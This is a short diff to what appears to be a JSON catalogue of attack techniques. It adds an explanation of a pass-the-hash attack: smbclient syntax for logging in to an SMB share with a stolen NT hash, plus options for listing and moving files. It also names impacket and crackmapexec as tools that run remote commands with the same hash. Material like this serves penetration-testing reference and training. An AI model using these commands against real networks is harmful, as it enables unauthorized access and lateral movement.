@@ -123,5 +123,6 @@
     "ntlm",
     "lateral",
     "pth"
-  ]
+  ],
+  "explain": "Pass-the-hash to an SMB share with smbclient - no cracking needed:\n  smbclient \\\\\\\\<target>\\\\<share>   connect to the share\n  -U <domain>/<user>       the account\n  --pw-nt-hash <nt_hash>   treat the supplied string as an NT hash, not a plaintext password\nAdd -c 'ls'/'get'/'put' to list or transfer files non-interactively; impacket-psexec/wmiexec and crackmapexec accept the same hash for execution and share enumeration."
 }
